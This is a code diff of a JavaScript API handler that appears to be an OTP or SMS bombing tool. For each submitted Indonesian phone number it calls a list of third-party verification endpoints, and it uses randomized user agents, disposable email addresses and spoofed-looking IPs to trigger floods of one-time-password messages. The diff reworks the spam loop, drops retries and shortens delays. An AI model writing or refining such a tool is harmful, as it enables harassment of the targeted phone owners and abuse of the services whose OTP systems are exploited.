@@ -2,7 +2,7 @@ const axios = require('axios');
 const { randomUUID, randomInt } = require('crypto');
 
 const CONFIG = {
-  timeout: 45000,
+  timeout: 30000,
   retries: 1
 };
 
@@ -16,14 +16,7 @@ const USER_AGENTS = [
 ];
 
 function randomUA() { return USER_AGENTS[randomInt(0, USER_AGENTS.length - 1)]; }
-
-function normalizePhone(phone) {
-  let p = phone.replace(/[^0-9]/g, '');
-  if (p.startsWith('0')) p = '62' + p.slice(1);
-  if (!p.startsWith('62')) p = '62' + p;
-  return p;
-}
-
+function randomIP() { return `${randomInt(1,255)}.${randomInt(1,255)}.${randomInt(1,255)}.${randomInt(1,255)}`; }
 function generateEmail() {
   const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
   let result = '';
@@ -31,8 +24,11 @@ function generateEmail() {
   return `${result}@bwmyga.com`;
 }
 
-function randomIP() {
-  return `${randomInt(1,255)}.${randomInt(1,255)}.${randomInt(1,255)}.${randomInt(1,255)}`;
+function normalizePhone(phone) {
+  let p = phone.replace(/[^0-9]/g, '');
+  if (p.startsWith('0')) p = '62' + p.slice(1);
+  if (!p.startsWith('62')) p = '62' + p;
+  return p;
 }
 
 async function getPinhomeCSRF() {
@@ -107,85 +103,49 @@ async function getOTPEndpoints(phone, clientIP) {
   ];
 }
 
-async function sendRequest(endpoint, idx, phone) {
+async function sendRequest(endpoint) {
   const hostname = new URL(endpoint.url).hostname;
   const headers = endpoint.headers || {};
 
-  await new Promise(resolve => setTimeout(resolve, randomInt(1000, 3000)));
+  await new Promise(resolve => setTimeout(resolve, randomInt(500, 1500)));
 
-  for (let attempt = 0; attempt <= CONFIG.retries; attempt++) {
-    try {
-      const config = { headers, timeout: CONFIG.timeout };
-      let resp;
-      if (endpoint.method === 'GET') {
-        resp = await axios.get(endpoint.url, config);
-      } else {
-        resp = await axios.post(endpoint.url, endpoint.data, config);
-      }
-
-      let responseBody = {};
-      try { responseBody = resp.data; } catch(e) {}
-
-      if ([200, 201, 202, 204].includes(resp.status)) {
-        return { success: true, hostname };
-      }
-
-      if (responseBody && (responseBody.success === true || responseBody.status === 'success' ||
-          responseBody.statusCode === 200 || responseBody.status === 202 ||
-          responseBody.is_success === true ||
-          responseBody.message === 'OTP terkirim' || responseBody.message === 'OTP sent successfully' ||
-          responseBody.message === 'Success.' ||
-          (responseBody.data && (responseBody.data.otp === 'processed' || responseBody.data.new_uuid || responseBody.data.status === 1)) ||
-          responseBody.secretCode)) {
-        return { success: true, hostname };
-      }
-
-      if (resp.status === 429) {
-        await new Promise(resolve => setTimeout(resolve, 30000));
-        continue;
-      }
-
-      if (attempt < CONFIG.retries) {
-        await new Promise(resolve => setTimeout(resolve, 5000));
-        continue;
-      }
-
-    } catch(e) {
-      if (attempt < CONFIG.retries) {
-        await new Promise(resolve => setTimeout(resolve, 5000));
-        continue;
-      }
+  try {
+    const config = { headers, timeout: CONFIG.timeout };
+    let resp;
+    if (endpoint.method === 'GET') {
+      resp = await axios.get(endpoint.url, config);
+    } else {
+      resp = await axios.post(endpoint.url, endpoint.data, config);
     }
+
+    let responseBody = {};
+    try { responseBody = resp.data; } catch(e) {}
+
+    if ([200, 201, 202, 204].includes(resp.status)) {
+      return { success: true, hostname };
+    }
+
+    if (responseBody && (responseBody.success === true || responseBody.status === 'success' ||
+        responseBody.statusCode === 200 || responseBody.status === 202 ||
+        responseBody.is_success === true ||
+        responseBody.message === 'OTP terkirim' || responseBody.message === 'OTP sent successfully' ||
+        responseBody.message === 'Success.' ||
+        (responseBody.data && (responseBody.data.otp === 'processed' || responseBody.data.new_uuid || responseBody.data.status === 1)) ||
+        responseBody.secretCode)) {
+      return { success: true, hostname };
+    }
+
+    return { success: false, hostname };
+  } catch(e) {
+    return { success: false, hostname };
   }
-  return { success: false, hostname };
-}
-
-async function spamNumber(phone, clientIP) {
-  const normalized = normalizePhone(phone);
-  const endpoints = await getOTPEndpoints(normalized, clientIP);
-  const results = [];
-
-  for (let i = 0; i < endpoints.length; i++) {
-    const result = await sendRequest(endpoints[i], i + 1, normalized);
-    results.push(result);
-  }
-
-  const success = results.filter(r => r.success).length;
-  const failed = results.filter(r => !r.success).length;
-
-  return {
-    phone: normalized,
-    total: endpoints.length,
-    success,
-    failed,
-    results: results.map(r => ({ hostname: r.hostname, status: r.success ? '✅' : '❌' }))
-  };
 }
 
 module.exports = async (req, res) => {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+  res.setHeader('Content-Type', 'application/json');
 
   if (req.method === 'OPTIONS') {
     return res.status(200).end();
@@ -205,24 +165,44 @@ module.exports = async (req, res) => {
     const clientIP = req.headers['cf-connecting-ip'] || 
                      req.headers['x-forwarded-for']?.split(',')[0] || 
                      req.headers['x-real-ip'] || 
-                     req.socket?.remoteAddress || 
                      randomIP();
 
-    const promises = phones.map(phone => spamNumber(phone, clientIP));
-    const results = await Promise.all(promises);
+    const allResults = [];
 
-    const totalSuccess = results.reduce((acc, r) => acc + r.success, 0);
-    const totalFailed = results.reduce((acc, r) => acc + r.failed, 0);
+    for (const phone of phones) {
+      const normalized = normalizePhone(phone);
+      const endpoints = await getOTPEndpoints(normalized, clientIP);
+      const results = [];
+
+      for (const endpoint of endpoints) {
+        const result = await sendRequest(endpoint);
+        results.push(result);
+      }
+
+      const success = results.filter(r => r.success).length;
+      const failed = results.filter(r => !r.success).length;
+
+      allResults.push({
+        phone: normalized,
+        total: endpoints.length,
+        success,
+        failed,
+        results: results.map(r => ({ hostname: r.hostname, status: r.success ? '✅' : '❌' }))
+      });
+    }
+
+    const totalSuccess = allResults.reduce((acc, r) => acc + r.success, 0);
+    const totalFailed = allResults.reduce((acc, r) => acc + r.failed, 0);
 
     return res.status(200).json({
       status: 'success',
       client_ip: clientIP,
       summary: {
-        total_numbers: results.length,
+        total_numbers: allResults.length,
         total_success: totalSuccess,
         total_failed: totalFailed
       },
-      details: results
+      details: allResults
     });
 
   } catch (error) {
